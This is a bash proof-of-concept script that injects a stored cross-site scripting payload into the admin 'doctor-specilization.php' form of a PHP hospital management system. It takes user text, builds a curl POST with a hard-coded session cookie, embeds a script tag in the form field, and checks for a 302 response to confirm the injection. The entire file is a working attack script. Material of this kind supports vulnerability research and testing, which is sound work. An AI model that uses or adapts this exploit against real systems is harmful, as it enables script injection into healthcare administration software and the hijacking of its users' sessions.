#!/bin/bash
echo Which test should be in your XSS attack?
read text
host=`ipconfig getifaddr en0`
response=`curl -i -s -k -X $'POST' \
    -H $'Host: '$host -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://10.0.0.214/hospital/hospital/hms/admin/doctor-specilization.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 99' -H $'Origin: http://10.0.0.214' -H $'DNT: 1' -H $'Connection: close' -H $'Cookie: PHPSESSID=g1mpom762nglpeptn51b4rg5h5' -H $'Upgrade-Insecure-Requests: 1' -H $'Cache-Control: max-age=0' \
    -b $'PHPSESSID=g1mpom762nglpeptn51b4rg5h5' \
    --data-binary $'doctorspecilization=%3C%2Ftd%3E%3Cscript%3Ealert%28%22'$text'%22%29%3B%3C%2Fscript%3E%3Ctd%3E&submit=\x0d\x0a' \
    $'http://localhost:8888/hospital/hms/admin/doctor-specilization.php'`
variable=$(echo $response -n 1|cut -d$' ' -f2)

if [ $variable  == 302 ];
  then
    echo 'Everything worked as expected!'
    echo 'Check the result at /hospital/hms/admin/doctor-specilization.php'
  else echo 'There was a problem'
fi
